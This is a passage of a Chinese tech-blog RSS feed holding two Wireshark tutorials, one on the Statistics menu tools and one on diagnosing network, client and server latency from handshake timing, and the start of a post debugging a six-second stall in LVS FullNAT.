&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Tue, 15 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-15-70736-aa634f1ba.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-15-70736-aa634f1ba.html</guid>
        
        
      </item>
    
      <item>
        <title>一站式学习Wireshark（七）：Statistics统计工具功能详解与应用</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;Wireshark一个强大的功能在于它的统计工具。使用Wireshark的时候，我们有各种类型的工具可供选择，从简单的如显示终端节点和会话到复杂的如Flow和IO图表。本文将介绍基本网络统计工具。包括：捕捉文件摘要（Summary）,捕捉包的层次结构（Protocol Hirarchy）, 会话（Conversations）, 终端节点（Endpoints）, HTTP。&lt;/p&gt;
&lt;div&gt;
&lt;h1&gt;更多信息&lt;/h1&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Summary:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从statistics菜单，选择&lt;strong&gt;Summary&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/aadb32a48278da7e97e35d6c53a43480.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;如下图的截屏所示，你会看到：&lt;/p&gt;
&lt;p&gt;File：&lt;/p&gt;
&lt;p&gt;捕捉文件的一般信息，如文件名和路径，长度，等等&lt;/p&gt;
&lt;p&gt;Time：&lt;/p&gt;
&lt;p&gt;第一个包和最后一个包的时间戳，以及抓包过程持续时间&lt;/p&gt;
&lt;p&gt;Capture：&lt;/p&gt;
&lt;p&gt;显示文件捕捉于哪一个接口，以及评论窗口&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/c678f0c4d509a5f83ae60d02d43414ae.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;在窗口的较低部分是&lt;strong&gt;Display&lt;/strong&gt;窗口，展示抓包文件统计信息的摘要，包括：&lt;/p&gt;
&lt;p&gt;捕捉报文的总数与百分比&lt;/p&gt;
&lt;p&gt;显示报文的数量（加上过滤条件之后）&lt;/p&gt;
&lt;p&gt;标记报文的数量&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/4dfb098373d67e9751ae9cf32197dfa3.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;何时使用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这一菜单简单收集所有抓包数据，在定义了过滤条件的时候，将呈现过滤后的数据。当想要知道每秒的平均报文数或是字节数时，可以使用此工具。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Protocol Hierarchy:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这一部分阐述如何确知网络运行数据。从statistics菜单，选择&lt;strong&gt;Protocol Hierarchy&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/26960ecb8b7d009daac3dcec26b023c2.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个窗口现实的是捕捉文件包含的所有协议的树状分支。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/fd250c8be18a6b290bd5ed06915efa9c.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Protocol Hierarchy窗口有如下字段：&lt;/p&gt;
&lt;p&gt;Protocol：&lt;/p&gt;
&lt;p&gt;协议名称&lt;/p&gt;
&lt;p&gt;% Packets：&lt;/p&gt;
&lt;p&gt;含有该协议的包数目在捕捉文件所有包所占的比例&lt;/p&gt;
&lt;p&gt;Packets：&lt;/p&gt;
&lt;p&gt;含有该协议的包的数目&lt;/p&gt;
&lt;p&gt;Bytes：&lt;/p&gt;
&lt;p&gt;含有该协议的字节数&lt;/p&gt;
&lt;p&gt;Mbit/s：&lt;/p&gt;
&lt;p&gt;抓包时间内的协议带宽&lt;/p&gt;
&lt;p&gt;End Packets：&lt;/p&gt;
&lt;p&gt;该协议中的包的数目（作为文件中的最高协议层）&lt;/p&gt;
&lt;p&gt;End Bytes：&lt;/p&gt;
&lt;p&gt;该协议中的字节数（作为文件中的最高协议层）&lt;/p&gt;
&lt;p&gt;End Mbit/s：&lt;/p&gt;
&lt;p&gt;抓包时间内的协议带宽（作为文件中的最高协议层）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;小贴士：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;包通常会包含许多协议，有很多协议会在每个包中被统计。End Packets，End Bytes，End Mbit/s列是该层在抓包中作为最后一层协议的统计数据（也就是说，协议处于报文的顶层，并且没有更高层信息了）。例如，没有载荷的TCP报文（例如，SYN报文），这一类没有负载任何上层信息的报文。这就是为什么在Ethernet层，IPv4层和UDP层报文计数为0，因为没有接收到以这些协议作为最后一层的帧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;何时使用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;值得注意的两点是：&lt;/p&gt;
&lt;p&gt;百分比永远指的是相同协议层级。例如，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用要点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. Percentage永远参照的是相同协议层。例如，上例中81.03%是IPv4报文，8.85%是IPv6报文，10.12%是ARP报文。第二层之上的各协议所占百分比总和是100%。&lt;/p&gt;
&lt;p&gt;2. 另一方面，TCP占总数据的75.70%，在TCP协议之内，只有12.74%的报文是HTTP，除此之外没有其他统计。这是由于Wireshark只统计有HTTP头的报文。它不统计如确认报文或数据报文这样没有HTTP头的报文。&lt;/p&gt;
&lt;p&gt;3. 为了使Wireshark同时统计数据报文，例如，TCP报文内部的HTTP报文，关闭&lt;strong&gt;Allow sub-dissector&lt;/strong&gt;选项，对TCP数据流重新统计。可在&lt;strong&gt;Preferences&lt;/strong&gt;菜单或&lt;strong&gt;Packet Details&lt;/strong&gt;面板中右键&lt;strong&gt;TCP&lt;/strong&gt;来实现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conversations：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 在Statistics菜单中，选择&lt;strong&gt;Coversations&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/bd6f1f07d4649683896fbad45cda9d06.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;2. 会看到以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/eabdf42a7432afe6ac200cdadcaa9d67.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;3. 可以选择第2层以太网统计数据，第3层IP统计数据，或第4层TCP或UDP统计数据。&lt;/p&gt;
&lt;p&gt;4. 可以选择以下统计工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;On layer 2(Ethernet)&lt;/strong&gt;：查找并过滤广播风暴或&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;On layer 3 or 4(TCP/IP)&lt;/strong&gt;&lt;strong&gt;：&lt;/strong&gt;通过互联网路由器端口并行连接，查看谁在向ISP传输数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;小贴士：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果你看到互联网上某一IP地址通过端口80（HTTP）向外传输大量数据流，你就需要将该地址复制入浏览器并且查看你的用户与哪一个网站通讯最多。&lt;/p&gt;
&lt;p&gt;如果没有得到结果，只需到标准DNS查询站点（Google一下DNS lookup）查看哪一种流量占用了你的网线。&lt;/p&gt;
&lt;p&gt;5. 也可以通过选择位于窗口左下方的&lt;strong&gt;Limit to display filter&lt;/strong&gt;复选框&lt;strong&gt;，&lt;/strong&gt;将会话统计信息进行显示过滤。这样，仅呈现所有通过显示过滤条件的统计数据。&lt;/p&gt;
&lt;p&gt;6.要查看IP地址对应名称，可以选择&lt;strong&gt;Name resolution&lt;/strong&gt;复选框。要查看IP名称解析，进入&lt;strong&gt;View | Name Resolution | Enable for Network layer&lt;/strong&gt;进行激活。&lt;/p&gt;
&lt;p&gt;7. 对于TCP或UDP，可以在Packet list中对指定报文进行标记，之后从菜单中选择&lt;strong&gt;Follow TCP Stream&lt;/strong&gt;或&lt;strong&gt;Follow UDP Stream&lt;/strong&gt;。从而定义一个显示过滤条件，仅显示指定数据流。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用要点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络会话是两个指定终端之间的数据流。例如，IP会话是两个IP地址之间的所有数据流，TCP会话包含了所有TCP连接。&lt;/p&gt;
&lt;p&gt;通过&lt;strong&gt;Conversations&lt;/strong&gt;列表，能看出很多网络问题。&lt;/p&gt;
&lt;p&gt;以太网会话统计&lt;/p&gt;
&lt;p&gt;在Ethernet conversations statistics中，查找以下问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大量的广播风暴：可以看见较轻微的广播风暴；而对于每秒数千甚至数万个报文的严重广播风暴，Wireshark会停止显示数据并且屏幕冻结。只有断开Wireshark连接时才能看见。&lt;/li&gt;
&lt;li&gt;如果你看到来自某一MAC地址的大量数据，查看会话第一部分的vendor ID，会给你一些导致问题的线索。即使MAC地址的第一部分标识了vendor，但它并不一定就标识了PC本身。这是由于MAC地址属于PC上安装的以太网芯片厂商，而并不一定属于PC制造商。如果无法识别数据流来源地址，可以ping嫌疑地址并通过ARP获取它的MAC地址，在交换机中查找该地址，如果有操作系统的话直接用find命令来定位。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IP会话统计&lt;/p&gt;
&lt;p&gt;在IP conversations statistics中，查找以下问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看收发大量数据流的IP地址。如果是你知道的服务器（你记得服务器的地址或地址范围），那问题就解决了；但也有可能只是某台设备正在扫描网络，或仅是一台产生过多数据的PC。&lt;/li&gt;
&lt;li&gt;查看扫描模式（scan pattern）。这可能是一次正常的扫描，如SNMP软件发送ping报文以查找网络，但通常扫描都不是好事情。&lt;/li&gt;
&lt;li&gt;一次典型的扫描模式如下图所示：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/439a1e3c42fba8cead8cff27c35e8332.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;本例中的扫描模式，一个IP地址，192.168.110.58，发送ICMP报文至192.170.3.44, 192.170.3.45, 192.170.3.46, 192.170.3.47,等等（上图仅显示扫描的很小一部分）。这种情况下我们有一个蠕虫病毒感染了网络上的所有PC，在它感染PC的时候，它就开始产生ICMP请求并将它们发送至网络。这些窄带连接（例如：WAN连接）可以很容易地被封锁。&lt;/p&gt;
&lt;p&gt;TCP/UDP会话统计&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看带有太多TCP连接的设备。每一个PC合理的连接数是10到20个，上百个则是不正常的。&lt;/li&gt;
&lt;li&gt;尝试查找无法辨识的端口号。它可能是正常的，但也可能是有问题的。下图显示了一次典型的TCP扫描：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/8d10d243fac731a5e7c7ac80acd4afe7.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Endpoints:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. &lt;/strong&gt;从statistics菜单，选择&lt;strong&gt;Endpoints&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/bff9e2e66d4e9efc5c49c806b8a8c662.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;2. 出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/4437c52b23b33f5460bf08b943bd670f.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;3. 此窗口中，能够看到第2,3,4层的endpoints，也就是以太网，IP, TCP或UDP。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用要点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这一工具列出了Wireshark发现的所有endpoints上的统计信息。可以是以下任意一种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;少量以太网endpoints（MAC地址）与大量IP终端节点（IP地址）：可能的情况例如，一个路由器从很多远端设备收发报文，我们会看见路由器的MAC地址及很多IP地址经由此处。&lt;/li&gt;
&lt;li&gt;少量IP终端节点与大量TCP终端节点：可能的情况是每一台主机有很多个TCP连接。可能是有很多连接的服务器的一个正常操作，也可能是一种网络攻击（如SYN攻击）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以下是一个网络中心的抓包示例，一个内部网络有四个HP服务器和一个Cisco路由器，MAC地址的第一部分已经解析了厂商名称：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/7db911d4df184d7b5745f86a38a7d015.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;当我们查看IPv4:191下的endpoints，我们看到有很多来自192.168.10.0, 192.168.30.0，以及其他网络地址。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/0755e4198d74eede37aca5c606afa55c.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. &lt;/strong&gt;从statistics菜单，选择&lt;strong&gt;HTTP&lt;/strong&gt;，将会出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/c938a97e3fc13e2119b2099a725c27bd.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;在HTTP子菜单中，可以看到以下信息：&lt;/p&gt;
&lt;p&gt;Packet Counter：&lt;/p&gt;
&lt;p&gt;每一个网站的报文数量。帮助识别有多少响应和请求。&lt;/p&gt;
&lt;p&gt;Requests：&lt;/p&gt;
&lt;p&gt;各网站的请求分布。&lt;/p&gt;
&lt;p&gt;Load Distribution：&lt;/p&gt;
&lt;p&gt;各网站的负载分布。&lt;/p&gt;
&lt;p&gt;按照以下操作步骤查看&lt;strong&gt;Packet Counter&lt;/strong&gt;统计信息：&lt;/p&gt;
&lt;p&gt;1. 进入&lt;strong&gt;Statistics | HTTP | Packet Counter。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2. 显示以下过滤窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/0509837aa0e3547e4538b4046a3e0034.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;3. 此窗口中，可设置过滤条件以查看符合过滤条件的统计信息。如果想要查看整个抓包文件的统计信息，留白不填。这就会显示IP层之上的统计信息，也就是所有HTTP报文。&lt;/p&gt;
&lt;p&gt;4. 点击&lt;strong&gt;Create Stat&lt;/strong&gt;按钮，会看到以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/5aeba4c17e55cb23ba068c63f270f1d4.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果要查看某一特定节点的HTTP统计信息，可以通过display filter的方式配置过滤条件。&lt;/p&gt;
&lt;p&gt;按照以下操作步骤查看&lt;strong&gt;HTTP Requests&lt;/strong&gt;统计信息：&lt;/p&gt;
&lt;p&gt;1. 进入&lt;strong&gt;Statistics | HTTP | Requests，&lt;/strong&gt;出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/a189bfc000984c307f1eea30076c527a.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;2. 选择所需过滤条件。对于所有数据，留白。&lt;/p&gt;
&lt;p&gt;3. 点击&lt;strong&gt;Create Stat&lt;/strong&gt;按钮，会出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/6778934bcfad139526d4b8dcd6601407.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;4. 要获得指定HTTP主机的统计信息，设置过滤条件http.host contains &amp;lt;host_name&amp;gt; 或 http.host==&amp;lt;host_name&amp;gt;。&lt;/p&gt;
&lt;p&gt;5. 例如，通过设置过滤条件http.host contains ndi-com.com，可以获得站点 &lt;a href=&quot;http://www.ndi-com.com/&quot; target=&quot;_blank&quot;&gt;www.ndi-com.com&lt;/a&gt;的统计信息，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/2cab759a25ea0f261482513445623b3a.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;6. 结果如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/a42f66b3c4f3c6768bc996d087c25336.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;按照以下操作步骤查看&lt;strong&gt;Load Distribution&lt;/strong&gt;统计信息：&lt;/p&gt;
&lt;p&gt;1. 进入&lt;strong&gt;Statistics | HTTP | Load Distribution。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;strong&gt; &lt;/strong&gt;出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/af5c7db6a5230248f9ae47d703bc5e82.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;3. 选择所需过滤条件。对于所有数据，留白。&lt;/p&gt;
&lt;p&gt;4. 点击&lt;strong&gt;Create Stat&lt;/strong&gt;按钮，会出现以下窗口：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/59a9cbd87223e3b2eba5722beeef8fb7.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用要点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们打开一个网页，通常会向若干个URL发送请求。本例中，我们打开的其中一个网页是&lt;a href=&quot;http://www.cnn.xn--com%2Cedition-lx0r784c19zieax92bm2p.cnn.com/&quot; target=&quot;_blank&quot;&gt;www.cnn.com，并将我们导向edition.cnn.com&lt;/a&gt;。我们发送了若干个请求：到root URL，到breaking_news URL，以及主页上两个其他位置。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 14 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-14-73482-53135089a.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-14-73482-53135089a.html</guid>
        
        
      </item>
    
      <item>
        <title>一站式学习Wireshark（六）：狙击网络高延时点</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;在某些情况下，丢包可能并不是造成延时的原因。你可能会发现尽管两台主机之间通讯速度很慢，但这种慢速并没有伴随着TCP重传或是重复ACK的征兆。在这种情况下，需要使用另一种方式来定位高延时点。&lt;/p&gt;
&lt;p&gt;查找高延时点最有效的方法之一是检查最初的握手信号以及跟随其后的几个报文。例如，一个简单的客户端与网络服务器的连接，客户端尝试通过浏览器访问网络服务器的站点。我们只关心这一通信序列的前六个报文，包括TCP握手过程，首次HTTP GET请求，对此GET请求的确认，以及从服务器发至客户端的第一个数据报文。&lt;/p&gt;
&lt;div&gt;
&lt;h1&gt;更多信息&lt;/h1&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;正常通讯&lt;/strong&gt;&lt;strong&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在讨论高延时状况之前，找一个正常的通讯作为参照。在第二节已经介绍过TCP握手过程以及HTTP通讯，这里不再赘述。在下面这张图里，我们关心的部分只有Time列：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/13fdeb837a35b3a269e49af2a916b108.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这一通讯序列是非常快速的，整个过程耗时不到0.1秒。&lt;/p&gt;
&lt;p&gt;接下来几个抓包文件包含同样的traffic模式，但是在报文时序上有所不同。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;慢速通讯——线路延时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让我们看看下面这个报文。注意到所有报文都是相同的，除了报文2和5的时间延时较长：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/78fe15de3cab8c56b8c4df57ebd79bb0.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;逐一分析这六个报文，立刻就会看到第一次延时。客户端（172.16.16.128）发送首次SYN报文以开始TCP握手，在服务器（74.125.95.104）返回SYN/ACK之前，有0.87秒的延时。这是线路延时的第一个信号，这是由客户端和服务器之间的设备引起的。&lt;/p&gt;
&lt;p&gt;我们判断这是线路延时的依据是所传送的报文类型特征。当服务器接收到一个SYN报文，只需花费很少的处理过程就可发送回复，因为这一工作负载并不包含任何传输层之上的处理。即使服务器工作负载非常繁重，它通常也会快速地以SYN/ACK来回复SYN报文。这就排除了服务器是高延时的潜在原因。&lt;/p&gt;
&lt;p&gt;客户端也被排除的原因在于，它除了接收SYN/ACK报文之外，没有进行任何处理。&lt;/p&gt;
&lt;p&gt;这一抓包的前两个报文帮我们排除了客户端和服务器，并指出了潜在原因。&lt;/p&gt;
&lt;p&gt;继续分析，我们发现结束三步握手信号的ACK报文快速出现，客户端发送的HTTP GET请求也是如此。产生这两个报文的所有处理在本地客户端接收到SYN/ACK之后进行，因此在客户端没有繁重的负载需要处理的情况下，这两个报文预计会很快传送。&lt;/p&gt;
&lt;p&gt;到了报文5，我们看到另一个延时高得离谱的报文。出现在最初的HTTP GET请求发送过后，从服务器返回的ACK报文花费了1.15秒才收到。接收到HTTP GET请求之后，服务器在开始发送数据之前首先发送了一个TCP ACK，同样只需占用服务器很少的处理。这是另一个线路延时的信号。&lt;/p&gt;
&lt;p&gt;不管何时你经历着线路延时，你几乎总是会看到：在最初的握手信号期间的SYN/ACK报文，以及整个通讯过程的ACK报文中，存在着高延时。即使这一信息并没有告诉你网络上延时的确切原因，至少让你明白客户端和服务器都不是延时点所在，因此延时发生在两者之间的设备。这时，你应当开始检查受影响主机之间的各种防火墙，路由器，以及代理，以定位罪魁祸首。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;慢速通讯——客户端延时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下一个延时场景的抓包如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/4a76e09686f9b7c44d7994979711de41.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这一抓包开始时很正常，TCP握手非常迅速，没有任何延时的迹象。正常状态持续至第四个报文：握手信号结束之后接收到一个HTTP GET请求。这个报文距离前一个接收到的报文有1.34秒的延时。&lt;/p&gt;
&lt;p&gt;要确认网络的延时点，需要检查第3和第4个报文之间发生了什么。报文3是客户端发送到服务器的TCP握手信号中的最后一个ACK，报文4是从客户端发送至服务器的GET请求。这两个报文的共同之处在于都是由客户端发送，并且独立于服务器。由于所有这些操作都集中在客户端上，GET请求应当在发送了ACK之后快速传送。&lt;/p&gt;
&lt;p&gt;不幸的是对于终端用户，从ACK到GET的传送并没有快速发生。GET报文的创建与传输取决于应用层的处理，这一过程中的延时意味着客户端无法及时的执行这一功能。这表示客户端最终为通讯中的高延时负责。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;慢速通讯——服务器延时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后一个延时场景的抓包如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/625f40df7012781b93dcc32afe2605d0.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;在这一抓包中，两个主机之间的TCP握手过程完成得干脆利落，因此开始时并无问题。接下来几个报文也很顺利，首个GET请求及回复ACK报文也在快速交付。直到最后一个报文，我们看到了高延时的信号。&lt;/p&gt;
&lt;p&gt;第六个报文是服务器响应客户端GET请求的第一个HTTP数据报文，但是在服务器发送GET请求的TCP ACK 0.98秒之后才到达。报文5和6的传送过程与我们在前一个场景所见ACK和GTE请求的传送类似。但是，在这一情况下，服务器是我们关注的焦点。&lt;/p&gt;
&lt;p&gt;报文5是服务器对从客户端接收GET请求的回应。只要该报文被发送，服务器就应当立即发送数据。这一读取，封装，传送的过程是由HTTP协议完成的，由于这是应用层协议，需要服务器参与处理过程。这一报文的延迟接收表明服务器无法在合理的时间内处理数据，最终指向服务器是延时点。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;延时定位思路：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过六个报文，我们能够定位服务器与客户端之间的网络高延时点。这些场景可能看起来有点复杂，但是下图能使你的定位延时过程变得简单快捷。这一原则几乎能应用于任何基于TCP的通讯。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/e8395bfb6d7188aa8b202cd7cf8c87b3.jpg&quot;&gt;&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 14 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-14-73477-5f4626e65.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-14-73477-5f4626e65.html</guid>
        
        
      </item>
    
      <item>
        <title>lvs FullNAT顿卡问题原因追查</title>
        <description>                &lt;h2&gt;问题描述：&lt;/h2&gt;
&lt;p&gt;在FullNAT在使用过程中，在开启SYNProxy的情况下，采用CURL去连接某个URL，会有偶尔卡顿一下，命令如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for i in `seq 1 10000`;do curl -o &#39;/dev/null&#39; -w &quot;%{time_total}:%{time_connect}:%{time_appconnect}:%{time_starttransfer}\n&quot;  http://192.168.1.100 &amp;gt;&amp;gt; fullnat.txt ; done&lt;br&gt;
100   582  100   582    0     0  54356      0 --:--:-- --:--:-- --:--:-- 58200&lt;br&gt;
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;br&gt;
                                   Dload  Upload   Total   Spent    Left  Speed&lt;br&gt;
100   582  100   582    0     0  54586      0 --:--:-- --:--:-- --:--:-- 58200&lt;br&gt;
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;br&gt;
                                   Dload  Upload   Total   Spent    Left  Speed&lt;/code&gt;&lt;br&gt;
以上命令偶尔会出现6s左右的超时等待。这个事情很神奇，为什么是6s呢，不是其他数字呢，如果是丢包的话，时间为什么这么固定呢，猜测这可能跟程序的实现有关系？&lt;/p&gt;
&lt;h2&gt;抓包复现：&lt;/h2&gt;
&lt;p&gt;我们在FullNAT机器和RealServer机器同时抓包。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://noops.me/wp-content/uploads/2014/07/fullnat-packet.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;
第一张图是在fullnat机器上抓的，是从client到fullnat的包，第二张图在real server上抓的，是从fullnat到real server的包，从图中可以看出，从xx.xx.116.25到xx.xx.48.24，xx.xx.116.25是client，xx.xx.48.24为fullnat的vip,从第一张图中看出，完成了三次握手以后，client就开始请求数据包，但是请求数据包一直没有回应，在超时以后一直进行重发。难道是请求数据包时丢了？我们从real server上的抓包情况可以得到结果。client从03秒(抓包机器时间设置相差3分钟，单秒数是对的)开始发送数据包，但是real server从09秒时才开始3次握手建立连接。建立连接以后，并且将重发的包又转发了一遍。那么，我们从二张图中得出，导致延迟的原因是fullnat和real server建立连接的过程中，第一个syn包丢了或者没有送出来，才导致了这6秒的延时，那么为什么是6s呢，这得从fullnat代码中查看，经过代码搜索，终于找到了蛛丝马迹。&lt;br&gt;
在ip_vs_proto_tcp.c文件中：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1158 int sysctl_ip_vs_tcp_timeouts[IP_VS_TCP_S_LAST + 1] = {&lt;br&gt;
